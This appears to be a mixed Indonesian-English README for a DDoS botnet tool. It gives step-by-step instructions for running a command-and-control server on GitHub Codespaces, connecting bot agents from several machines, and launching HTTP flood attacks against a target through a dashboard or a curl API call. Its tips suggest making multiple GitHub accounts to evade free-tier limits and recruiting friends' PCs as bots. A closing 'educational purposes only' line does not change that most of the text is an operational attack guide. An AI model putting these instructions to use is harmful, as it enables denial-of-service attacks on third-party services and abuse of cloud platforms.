# 🚀 GitHub Codespaces Quick Start

## 🎯 Setup C2 Server di GitHub Codespaces (100% GRATIS)

### Step 1: Create Codespace untuk C2 Server

1. **Buka repo GitHub kamu:**
   ```
   https://github.com/AryzXploit/BOT-TELE-DOS
   ```

2. **Click tombol hijau "Code"**

3. **Pilih tab "Codespaces"**

4. **Click "Create codespace on main"**

5. **Wait 1-2 menit** sampai environment ready

### Step 2: Start C2 Server

Di terminal Codespace yang baru terbuka:

```bash
# Dependencies sudah auto-install
# Langsung start server:
npm run c2-server
```

Output akan seperti ini:
```
╔═══════════════════════════════════════════════════════════╗
║          🎯 C2 SERVER STARTED SUCCESSFULLY 🎯            ║
╚═══════════════════════════════════════════════════════════╝

📡 C2 Server running on: http://0.0.0.0:8080
🌐 Dashboard: http://localhost:8080/dashboard
🔌 WebSocket: ws://localhost:8080
🔑 API Key: aryzz-c2-api-key-2024
```

### Step 3: Get Public URL

Codespaces akan auto-forward port 8080. Ada 2 cara:

**Cara 1: Dari Notifikasi**
- Akan muncul notifikasi "Your application running on port 8080 is available"
- Click **"Open in Browser"**

**Cara 2: Dari PORTS Tab**
- Click tab **"PORTS"** di bagian bawah terminal
- Find port `8080`
- Click **globe icon** (🌐) untuk open in browser
- Atau right-click → **"Copy Local Address"**

**Cara 3: Dari Terminal**
```bash
# Get public URL
echo "https://$CODESPACE_NAME-8080.preview.app.github.dev"
```

Copy URL ini! Format: `https://xxx-8080.preview.app.github.dev`

### Step 4: Access Dashboard

Open URL dari step 3 di browser:
```
https://xxx-8080.preview.app.github.dev/dashboard
```

Login credentials:
- Username: `admin`
- Password: `admin123`

### Step 5: Connect Bot Agents

Sekarang kamu bisa connect bot agents dari mana saja!

#### Option A: From Local PC

```bash
# Di komputer kamu
git clone https://github.com/AryzXploit/BOT-TELE-DOS
cd BOT-TELE-DOS
npm install

# Connect ke C2 server (ganti URL dengan punya kamu)
node index.js c2-agent --c2-url https://xxx-8080.preview.app.github.dev
```

#### Option B: From Another Codespace

1. Create codespace baru (atau fork repo dulu)
2. Di terminal:
```bash
npm install

# Connect ke C2 server
node index.js c2-agent --c2-url https://xxx-8080.preview.app.github.dev
```

#### Option C: From Multiple Terminals (Same Codespace)

```bash
# Terminal 1: C2 Server (sudah running)

# Terminal 2: Bot Agent 1
node index.js c2-agent --c2-url https://xxx-8080.preview.app.github.dev

# Terminal 3: Bot Agent 2
node index.js c2-agent --c2-url https://xxx-8080.preview.app.github.dev
```

### Step 6: Launch Attack!

**Via Dashboard:**
1. Go to dashboard: `https://xxx-8080.preview.app.github.dev/dashboard`
2. Click tab **"Control Panel"**
3. Fill in:
   - Target: `https://target.com`
   - Method: `GET` (atau pilih lain)
   - Duration: `60` seconds
   - Threads: `100`
   - RPC: `10`
4. Click **"Launch Attack"** 🚀

**Via API:**
```bash
curl -X POST https://xxx-8080.preview.app.github.dev/api/attack/start \
  -H "X-API-Key: aryzz-c2-api-key-2024" \
  -H "Content-Type: application/json" \
  -d '{
    "target": "https://target.com",
    "method": "GET",
    "threads": 100,
    "duration": 60,
    "rpc": 10
  }'
```

---

## 🎮 Advanced Setup

### Multiple Bots Architecture

```
┌─────────────────────────────┐
│  GitHub Codespace #1        │
│  C2 Server                  │
│  https://xxx-8080...        │
└──────────────┬──────────────┘
               │
    ┌──────────┼──────────┐
    │          │          │
┌───▼────┐ ┌──▼─────┐ ┌──▼─────┐
│ Local  │ │ Code-  │ │ Code-  │
│ PC     │ │ space  │ │ space  │
│ Bot 1  │ │ Bot 2  │ │ Bot 3  │
└────────┘ └────────┘ └────────┘
```

### Keep Server Alive

Codespace akan sleep setelah 30 menit idle. Untuk keep alive:

```bash
# Install PM2
npm install -g pm2

# Start dengan PM2
pm2 start index.js --name c2-server -- c2-server -p 8080

# View logs
pm2 logs c2-server

# Monitor
pm2 monit
```

### Auto-Restart on Crash

```bash
pm2 start index.js --name c2-server -- c2-server -p 8080 --watch

# Save config
pm2 save

# Setup startup
pm2 startup
```

---

## 📊 Monitor Your Bots

### Via Dashboard

Go to: `https://xxx-8080.preview.app.github.dev/dashboard`

You'll see:
- 📊 Total bots connected
- 🟢 Online bots
- ⚡ Running attacks
- 📈 Total requests sent

### Via API

```bash
# List all bots
curl -H "X-API-Key: aryzz-c2-api-key-2024" \
  https://xxx-8080.preview.app.github.dev/api/bots

# Get statistics
curl -H "X-API-Key: aryzz-c2-api-key-2024" \
  https://xxx-8080.preview.app.github.dev/api/stats/overview

# List attacks
curl -H "X-API-Key: aryzz-c2-api-key-2024" \
  https://xxx-8080.preview.app.github.dev/api/attacks
```

---

## 🔧 Troubleshooting

### Port 8080 Already in Use

```bash
# Kill process on port 8080
lsof -ti:8080 | xargs kill -9

# Or use different port
node index.js c2-server -p 9000
```

### Codespace Stopped

- Codespace auto-stops setelah 30 menit idle
- Buka kembali dari GitHub → Codespaces
- Server akan auto-start jika pakai PM2

### Bot Can't Connect

```bash
# Check C2 server running
curl https://xxx-8080.preview.app.github.dev/api/health

# Check URL correct
echo $CODESPACE_NAME

# Check firewall (biasanya tidak ada di Codespaces)
```

### Dashboard Not Loading

1. Check port forwarding di PORTS tab
2. Make sure port visibility = **Public**
3. Try incognito/private browser
4. Clear browser cache

---

## 💡 Pro Tips

### 1. Multiple GitHub Accounts

- Buat multiple GitHub accounts
- Setiap account dapat 60 jam Codespaces gratis/bulan
- Total: 60 jam × jumlah accounts

### 2. Fork Repository

- Fork repo ke account lain
- Create codespace dari fork
- Lebih banyak bots!

### 3. Share with Friends

```bash
# Share C2 URL dengan teman
https://xxx-8080.preview.app.github.dev

# Mereka bisa connect bot dari PC mereka:
node index.js c2-agent --c2-url https://xxx-8080.preview.app.github.dev
```

### 4. Use Custom Domain (Advanced)

```bash
# Install cloudflared
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
chmod +x cloudflared-linux-amd64

# Create tunnel
./cloudflared-linux-amd64 tunnel --url http://localhost:8080

# Get custom URL: https://xxx.trycloudflare.com
```

### 5. Backup Database

```bash
# Backup c2.db
cp c2.db c2.db.backup

# Download to local
# Right-click c2.db → Download
```

---

## 🎯 Complete Example

### Scenario: 1 C2 Server + 3 Bot Agents

**Codespace 1 (C2 Server):**
```bash
npm run c2-server
# URL: https://abc-8080.preview.app.github.dev
```

**Codespace 2 (Bot Agent 1):**
```bash
node index.js c2-agent --c2-url https://abc-8080.preview.app.github.dev
```

**Local PC (Bot Agent 2):**
```bash
git clone https://github.com/AryzXploit/BOT-TELE-DOS
cd BOT-TELE-DOS
npm install
node index.js c2-agent --c2-url https://abc-8080.preview.app.github.dev
```

**Friend's PC (Bot Agent 3):**
```bash
git clone https://github.com/AryzXploit/BOT-TELE-DOS
cd BOT-TELE-DOS
npm install
node index.js c2-agent --c2-url https://abc-8080.preview.app.github.dev
```

**Launch Attack:**
```bash
# Via dashboard
Open: https://abc-8080.preview.app.github.dev/dashboard
Go to Control Panel → Fill form → Launch Attack

# Attack akan distributed ke 3 bots!
# Each bot: 100 threads / 3 = ~33 threads
```

---

## 📞 Need Help?

- **GitHub Issues:** https://github.com/AryzXploit/BOT-TELE-DOS/issues
- **Telegram:** @AryzzXploit
- **Documentation:** Read `DEPLOY-FREE.md` and `C2-GUIDE.md`

---

## ⚠️ Important Notes

1. **Free Tier Limits:**
   - 60 hours/month per account
   - 2 core CPU, 4GB RAM
   - Auto-sleep after 30 min idle

2. **Port Visibility:**
   - Make sure port 8080 is **Public**
   - Go to PORTS tab → Right-click port → Port Visibility → Public

3. **Legal Use:**
   - Only test your own servers
   - Get permission before testing
   - Educational purposes only

---

**Developed by Aryzz-Dev** 🔥
**Deploy in 5 minutes, attack in seconds!** ⚡
